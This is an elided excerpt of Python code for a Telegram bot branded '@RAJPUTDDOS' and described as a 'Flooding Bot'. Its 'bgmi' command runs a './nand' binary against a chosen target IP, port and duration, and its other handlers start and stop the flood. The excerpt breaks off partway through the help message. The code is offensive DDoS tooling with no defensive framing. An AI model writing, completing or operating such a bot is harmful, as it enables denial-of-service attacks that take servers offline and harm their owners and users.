...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_command = ['./nand', target_ip, port, duration]
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with threads.OWMER- @RAJPUTDDOS.')
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    await update.message.reply_text('🚀 @RAJPUTDDOS STARTED...🚀')
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_process = None
    await update.message.reply_text('@RAJPUTDDOS STOPPED 🛑...')
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "Welcome to the Flooding Bot by @RAJPUTDDOS..! Here are the available commands:\n\n"
        "Admin Commands:\n"
